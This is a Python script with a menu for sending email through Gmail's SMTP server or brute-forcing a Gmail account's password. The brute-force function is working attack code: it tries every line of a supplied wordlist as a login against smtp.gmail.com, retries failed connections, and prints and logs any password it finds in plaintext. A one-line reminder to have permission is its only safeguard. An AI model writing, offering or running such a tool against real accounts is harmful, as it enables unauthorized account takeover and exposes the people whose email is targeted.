import os
import smtplib
import logging
import time
from tkinter import Tk, simpledialog

class Color:
    OK = '\033[92m'
    FAIL = '\033[91m'
    BOLD = '\033[1m'
    ENDC = '\033[0m'
    UNDERLINE = '\033[4m'

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def connect_to_smtp_server():
    retries = 5
    for i in range(retries):
        try:
            smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
            smtpserver.ehlo()
            smtpserver.starttls()
            logging.info("SMTP connection established successfully.")
            return smtpserver
        except (smtplib.SMTPConnectError, smtplib.SMTPServerDisconnected) as e:
            logging.error(f"Attempt {i+1}/{retries} failed: {e}")
            time.sleep(5)
    raise Exception("Failed to connect to the SMTP server after several attempts.")

def get_user_input(prompt):
    try:
        return input(prompt)
    except RuntimeError:
        root = Tk()
        root.withdraw()
        result = simpledialog.askstring("Input", prompt)
        root.destroy()
        return result

def brute_force_email():
    print(Color.BOLD + "Brute Force Email Password Testing" + Color.ENDC)
    print(Color.BOLD + "Ensure you have permission to test this account." + Color.ENDC)

    user = get_user_input("Enter the email address to test: ")
    passwfile_path = get_user_input("Enter the path to your password file: ")

    try:
        with open(passwfile_path, "r") as passwfile:
            smtpserver = connect_to_smtp_server()
            for password in passwfile:
                password = password.strip()
                try:
                    smtpserver.login(user, password)
                    print(Color.OK + f"Password Found: {password}" + Color.ENDC)
                    logging.info(f"Password found for {user}: {password}")
                    break
                except smtplib.SMTPAuthenticationError:
                    print(Color.FAIL + f"Password Incorrect: {password}" + Color.ENDC)
                time.sleep(1)
            else:
                print(Color.FAIL + "No valid password found in the provided list." + Color.ENDC)
                logging.info(f"No valid password found for {user}.")
    except FileNotFoundError:
        logging.error(f"Password file '{passwfile_path}' not found.")
    except Exception as e:
        logging.error(f"An unexpected error occurred during brute-force testing: {e}")

def send_email():
    try:
        smtpserver = connect_to_smtp_server()

        email_user = get_user_input("Enter your Gmail address: ")
        email_pass = get_user_input("Enter your Gmail password: ")

        smtpserver.login(email_user, email_pass)
        logging.info("Logged in successfully.")

        from_addr = email_user
        to_addr = get_user_input("Enter recipient email address: ")
        subject = get_user_input("Enter email subject: ")
        body = get_user_input("Enter email body: ")
        msg = f"Subject: {subject}\n\n{body}"

        smtpserver.sendmail(from_addr, to_addr, msg)
        print(Color.OK + "Email sent successfully!" + Color.ENDC)
        logging.info("Email sent successfully.")

        smtpserver.quit()
        logging.info("SMTP server connection closed.")
    except smtplib.SMTPAuthenticationError as auth_err:
        logging.error(Color.FAIL + f"Authentication failed: {auth_err}" + Color.ENDC)
    except smtplib.SMTPException as smtp_err:
        logging.error(Color.FAIL + f"SMTP error occurred: {smtp_err}" + Color.ENDC)
    except Exception as e:
        logging.error(Color.FAIL + f"An unexpected error occurred: {e}" + Color.ENDC)

if __name__ == "__main__":
    print("Select an option:")
    print("1. Send an email")
    print("2. Brute-force email password")
    choice = get_user_input("Enter your choice (1/2): ")

    if choice == "1":
        send_email()
    elif choice == "2":
        brute_force_email()
    else:
        print("Invalid choice. Exiting.")